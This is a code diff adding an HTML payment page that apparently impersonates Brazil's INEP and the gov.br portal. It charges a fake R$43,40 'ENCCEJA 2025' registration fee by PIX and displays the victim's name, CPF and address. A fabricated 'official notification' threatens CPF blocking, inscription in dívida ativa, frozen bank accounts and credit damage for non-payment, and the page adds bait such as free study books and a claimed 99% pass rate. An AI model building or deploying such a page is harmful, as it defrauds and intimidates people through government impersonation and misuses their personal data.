+                        window.location.href = data.redirect_to + '?' + urlParams.toString();
+                    } else {
+                        window.location.href = '/obrigado?' + urlParams.toString();
+                    }
+                    }
+                }
+                // Se o pagamento foi recusado ou cancelado
+                else if (data.status === 'CANCELED' || data.status === 'REJECTED' || data.status === 'FAILED') {
+                    // Mostrar mensagem de erro
+                    document.getElementById('error-message').textContent = 'Pagamento recusado ou cancelado. Por favor, tente novamente.';
+                    document.getElementById('error-container').classList.remove('hidden');
+                    
+                    // Parar verificações
+                    paymentConfirmed = true;
+                }
+            })
+            .catch(error => {
+                console.error('Erro ao verificar status do pagamento:', error);
+            });
+        }
+    </script>
+</head>
+<body class="flex flex-col min-h-screen">
+    <!-- Government Header -->
+    <header class="gov-header text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo do Brasil" class="h-6" />
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- INEP Header -->
+    <div class="inep-header py-3">
+        <div class="container mx-auto px-4">
+            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <style>
+                        .cls-2{fill:#fff}
+                    </style>
+                </defs>
+                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" fill-rule="evenodd" id="path-1"/>
+            </svg>
+        </div>
+    </div>
+    <!-- Main Content -->
+    <main class="flex-grow py-8">
+        <div class="container mx-auto px-4 max-w-3xl">
+            <!-- ENCCEJA Logo -->
+            <div class="text-center mb-6">
+                <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://lh4.googleusercontent.com/proxy/_9Y0LIQJY1EdBdBVxy9MNsDDxrwGhfi2sjqj0zyi8ozsQS0eaxz82ZcL248lfPHCGJ3N07JVCIidVaFuR9pcnZNvpdEzt9bcLzGuHf9h09CpscRLpaqVYz0" width="420"/>
+            </div>
+            <!-- Payment Container -->
+            <div class="border border-gray-300 rounded">
+                <!-- Form Header -->
+                <!-- Notificações de pagamentos -->
+                <div id="notifications-container" class="fixed top-0 left-0 right-0 z-50 flex justify-center pointer-events-none"></div>
+                
+                <div class="form-header py-3 px-4 text-center bg-red-600">
+                    <h2 class="text-lg flex items-center justify-center text-white font-semibold">
+                        <div class="animate-spin w-5 h-5 border-2 border-white border-t-transparent rounded-full mr-2"></div>
+                        <span>AGUARDANDO PAGAMENTO</span>
+                    </h2>
+                </div>
+                <!-- Content -->
+                <div class="p-6 relative bg-gray-50">
+                    <!-- Cabeçalho oficial -->
+                    <div class="flex justify-between items-center mb-4 border-b pb-3 border-gray-300">
+                        <div class="text-left">
+                            <h3 class="text-[#355792] font-bold text-lg">ENCCEJA 2025</h3>
+                            <p class="text-xs text-gray-600">Inscrição nº 20250438124</p>
+                        </div>
+                        <div class="text-right">
+                            <p class="font-semibold text-red-600">Taxa de Inscrição: R$ 43,40</p>
+                            <p class="text-xs text-gray-600">Vencimento: <span id="expiration-date" class="countdown">10:00</span></p>
+                        </div>
+                    </div>
+                    
+                    <!-- Dados do participante e agendamento -->
+                    <div class="mb-5">
+                        <div class="bg-[#355792] text-white py-2 px-3 rounded-t-md font-semibold text-sm">
+                            DADOS DO PARTICIPANTE
+                        </div>
+                        <div class="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                <div>
+                                    <p class="mb-1 text-xs text-gray-500">Nome completo</p>
+                                    <p class="font-medium text-gray-800 mb-3" id="user-name">Carregando...</p>
+                                    
+                                    <p class="mb-1 text-xs text-gray-500">CPF</p>
+                                    <p class="font-medium text-gray-800 mb-3" id="user-cpf">Carregando...</p>
+                                    
+                                    <p class="mb-1 text-xs text-gray-500">Cidade</p>
+                                    <p class="font-medium text-gray-800" id="user-city">Carregando...</p>
+                                </div>
+                                <div>
+                                    <div class="p-3 bg-amber-50 border-l-4 border-amber-400 mb-3">
+                                        <p class="text-amber-800 font-medium text-sm">Situação da inscrição:</p>
+                                        <p class="text-red-600 font-bold">PENDENTE - AGUARDANDO PAGAMENTO</p>
+                                    </div>
+                                    <div class="flex items-center mb-3">
+                                        <div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mr-3">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
+                                            </svg>
+                                        </div>
+                                        <div>
+                                            <p class="text-xs text-gray-500 mb-0">Data da prova</p>
+                                            <p class="font-semibold text-gray-800">03/08/2025</p>
+                                        </div>
+                                    </div>
+                                    <div class="flex items-center">
+                                        <div class="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mr-3">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+                                            </svg>
+                                        </div>
+                                        <div>
+                                            <p class="text-xs text-gray-500 mb-0">Horário</p>
+                                            <p class="font-semibold text-gray-800">9h às 13h</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="bg-[#355792] text-white py-2 px-3 rounded-t-md font-semibold text-sm">
+                            DADOS DA PROVA
+                        </div>
+                        <div class="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
+                            <div class="flex flex-wrap -mx-2">
+                                <div class="w-full md:w-1/3 px-2 mb-3 md:mb-0">
+                                    <div class="p-3 bg-gray-100 rounded-md h-full">
+                                        <p class="text-xs text-gray-500 mb-1">Nível da prova</p>
+                                        <p class="font-medium text-green-600">Fácil</p>
+                                    </div>
+                                </div>
+                                <div class="w-full md:w-1/3 px-2 mb-3 md:mb-0">
+                                    <div class="p-3 bg-gray-100 rounded-md h-full">
+                                        <p class="text-xs text-gray-500 mb-1">Quantidade de questões</p>
+                                        <p class="font-medium">30 questões</p>
+                                    </div>
+                                </div>
+                                <div class="w-full md:w-1/3 px-2">
+                                    <div class="p-3 bg-gray-100 rounded-md h-full">
+                                        <p class="text-xs text-gray-500 mb-1">Nível de aprovação</p>
+                                        <p class="font-medium text-green-600">99%</p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <!-- Botão para inicializar sons em dispositivos móveis -->
+                            <div id="sound-init-container" class="mt-4 mb-2 flex justify-center">
+                                <button onclick="initializeSoundsManually()" id="sound-init-button" 
+                                    class="bg-blue-600 text-white px-4 py-2 rounded-md text-sm shadow-md hover:bg-blue-700 transition duration-200 flex items-center">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.536 8.464a5 5 0 010 7.072m2.828-9.9a9 9 0 010 12.728M5.586 15.465a5 5 0 001.414 1.414M5 12a7 7 0 0114 0 7 7 0 01-7 7 7 7 0 01-7-7z" />
+                                    </svg>
+                                    Ativar notificações sonoras
+                                </button>
+                            </div>
+                            
+                            <!-- Informações do local da prova -->
+                            <div class="mt-2 bg-blue-50 p-3 border-l-4 border-blue-400 rounded-r-md">
+                                <div class="flex items-start">
+                                    <div class="text-blue-500 mt-1 mr-2">
+                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4" />
+                                        </svg>
+                                    </div>
+                                    <div>
+                                        <p class="text-sm text-blue-800 font-medium">Local da prova: <span class="font-normal">Escola pública mais próxima da sua residência</span></p>
+                                        <p class="text-xs text-gray-600 mt-1">Após a confirmação do pagamento, você receberá seu Cartão de Confirmação com todas as informações da prova, incluindo o endereço completo da escola onde realizará o exame.</p>
+                                    </div>
+                                </div>
+                            </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Aviso importante -->
+                        <!-- Material didático gratuito -->
+                        <div class="bg-[#355792] text-white py-2 px-3 rounded-t-md font-semibold text-sm">
+                            MATERIAL DIDÁTICO GRATUITO
+                        </div>
+                        <div class="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
+                            <div class="flex flex-col md:flex-row">
+                                <div class="md:w-3/4 pr-0 md:pr-6 mb-4 md:mb-0">
+                                    <p class="text-gray-700 mb-3">Realizando o pagamento da Taxa de Inscrição, você receberá <span class="font-semibold text-green-600">GRATUITAMENTE</span> o seguinte material didático:</p>
+                                    
+                                    <div class="flex items-center mb-3">
+                                        <div class="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center mr-3 flex-shrink-0">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                                            </svg>
+                                        </div>
+                                        <div>
+                                            <p class="font-medium text-gray-800">Apostila ENCCEJA 2025 Atualizada</p>
+                                            <p class="text-xs text-gray-600">Conteúdo completo para todas as matérias do exame</p>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="flex items-center mb-3">
+                                        <div class="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center mr-3 flex-shrink-0">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                                            </svg>
+                                        </div>
+                                        <div>
+                                            <p class="font-medium text-gray-800">Apostila com 700 Questões</p>
+                                            <p class="text-xs text-gray-600">Exercícios e simulados comentados para praticar</p>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="flex items-center">
+                                        <div class="w-8 h-8 bg-orange-100 rounded-full flex items-center justify-center mr-3 flex-shrink-0">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-orange-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
+                                            </svg>
+                                        </div>
+                                        <div>
+                                            <p class="font-semibold text-orange-700">ATENÇÃO</p>
+                                            <p class="text-xs text-gray-700">O material será enviado para seu endereço em até 4 dias úteis após a confirmação do pagamento.</p>
+                                            <p class="text-xs text-gray-700 mt-1"><strong>Endereço de entrega:</strong> <span id="user-address" class="text-gray-600">Carregando...</span></p>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="md:w-1/4 flex justify-center items-center">
+                                    <img src="https://http2.mlstatic.com/D_NQ_NP_652146-MLB75158637721_032024-O.webp" alt="Apostilas ENCCEJA 2025" class="max-w-full h-auto max-h-48 rounded shadow-md">
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Aviso importante -->
+                        <div class="bg-red-600 p-4 rounded-md mb-5 text-white shadow-md">
+                        <div class="flex items-center mb-2">
+                            <i class="fas fa-exclamation-triangle text-yellow-300 mr-2 text-xl"></i>
+                            <h3 class="font-bold text-lg text-base" style="font-size: 16px;">NOTIFICAÇÃO OFICIAL</h3>
+                        </div>
+                        <p class="mb-3" style="font-size: 16px;">Ao prosseguir, você concordou com o pagamento da taxa de inscrição no valor de <strong>R$43,40</strong>. Conforme regulamento, o não pagamento resultará em <strong>bloqueio de CPF</strong> por 3 anos no sistema ENCCEJA.</p>
+                        <p class="mb-3" style="font-size: 16px;">O não pagamento resultará na inscrição do nome e CPF em <strong>dívida ativa da União</strong>, incidindo multas e encargos legais sobre o valor original. Esta situação pode acarretar em bloqueio de contas bancárias, intimações judiciais, redução do score de crédito e negativação do nome em órgãos de proteção.</p>
+                        <p class="font-semibold" style="font-size: 16px;">Efetue o pagamento imediatamente para regularizar sua situação.</p>
+                    </div>
+                    
+                    <!-- Loading Container -->
+                    <div id="loading-container" class="text-center py-10">
+                        <div class="spinner mb-4"></div>
+                        <p class="text-lg font-semibold text-gray-700">Gerando código de pagamento...</p>
+                        <p class="text-sm text-gray-500 mt-2">Aguarde alguns instantes...</p>
+                    </div>
+                    
+                    <!-- Error Container -->
+                    <div id="error-container" class="bg-red-50 p-4 rounded-md border border-red-300 text-red-800 my-4 hidden">
+                        <p class="flex items-start">
+                            <i class="fas fa-exclamation-circle text-red-600 mr-2 mt-1"></i>
+                            <span id="error-message">Ocorreu um erro ao processar o pagamento.</span>
+                        </p>
+                    </div>
+                    
+                    <!-- Warning Container -->
+                    <div id="warning-container" class="bg-amber-50 p-4 rounded-md border border-amber-300 text-amber-800 my-4 hidden">
+                        <p class="flex items-start">
+                            <i class="fas fa-exclamation-triangle text-amber-600 mr-2 mt-1"></i>
+                            <span id="warning-message">Aviso: Por favor, aguarde enquanto processamos seu pagamento.</span>
+                        </p>
+                    </div>
+                    
+                    <!-- Payment Details -->
+                    <div id="payment-container" class="hidden">
+                        <div class="mb-6">
+                            <div class="flex items-center justify-between mb-4">
+                                <h3 class="text-lg font-bold text-gray-800">Taxa de Inscrição</h3>
+                                <p class="text-lg font-bold text-gray-800">R$ 43,40</p>
+                            </div>
+                            
+                            <!-- PIX Code -->
+                            <div id="pix-code-container" class="hidden mb-6">
+                                <p class="text-center font-semibold text-gray-700 mb-2">Copie o código PIX:</p>
+                                <div class="pix-container p-3 rounded-md mb-4">
+                                    <div class="bg-white border border-gray-300 p-3 rounded-md text-sm text-gray-800 break-all font-mono">
+                                        <p id="pix-code" class="max-h-24 overflow-y-auto"></p>
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mb-3">
+                                    <button id="copy-button" onclick="copyPixCode()" class="bg-green-600 hover:bg-green-700 text-white py-2 px-5 rounded-md flex items-center">
+                                        <i class="fas fa-copy mr-2"></i>
+                                        <span>Copiar código PIX</span>
+                                    </button>
+                                </div>
+                                <div class="bg-gray-100 p-4 rounded-md text-gray-700 text-sm mb-4">
+                                    <h4 class="font-semibold mb-2">Como pagar com o PIX Copia e Cola:</h4>
+                                    <ol class="list-decimal pl-5 space-y-1">
+                                        <li>Clique no botão verde acima para copiar o código</li>
+                                        <li>Abra o aplicativo do seu banco</li>
+                                        <li>Selecione a opção "Pagar com PIX" ou "PIX Copia e Cola"</li>
+                                        <li>Cole o código copiado no campo indicado</li>
+                                        <li>Confira o valor de R$ 43,40 e confirme o pagamento</li>
+                                    </ol>
+                                </div>
+                            </div>
+                            
+                            <!-- QR Code -->
+                            <div id="qr-code-container" class="hidden">
+                                <p class="text-center font-semibold text-gray-700 mb-3">Ou escaneie o QR Code com seu aplicativo bancário:</p>
+                                <div class="flex justify-center mb-6">
+                                    <img id="qr-code-img" src="" alt="QR Code PIX" class="w-48 h-48 border border-gray-300 p-2 bg-white">
+                                </div>
+                            </div>
+                            
+                            <div class="bg-yellow-50 p-4 rounded-md border border-yellow-200 text-yellow-800 mt-6">
+                                <p class="flex items-start">
+                                    <i class="fas fa-exclamation-triangle text-yellow-600 mr-2 mt-1"></i>
+                                    <span>
+                                        <strong>Atenção:</strong> Após o pagamento, o sistema atualizará o status da sua inscrição automaticamente. O comprovante de inscrição estará disponível em até 30 minutos após a confirmação do pagamento.
+                                    </span>
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    <!-- Footer -->
+    <footer class="footer-bg text-white py-4 text-xs">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center mb-2">
+                <svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid" width="69" height="20" viewBox="0 0 69 20" class="h-16 w-auto mb-3">
+                    <defs><style>.cls-2{fill:#fff}</style></defs>
+                    <path d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" id="path-1" class="cls-2" fill-rule="evenodd"/>
+                </svg>
+                <p class="text-sm text-center mb-2">Instituto Nacional de Estudos e Pesquisas Educacionais</p>
+            </div>
+            <div class="flex justify-between items-center">
+                <div>
+                    © MEC - Ministério da Educação | INEP - Instituto Nacional de Estudos e Pesquisas
+                </div>
+                <div class="flex items-center">
+                    <i class="fas fa-phone-alt mr-1"></i>
+                    0800 616161
+                </div>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
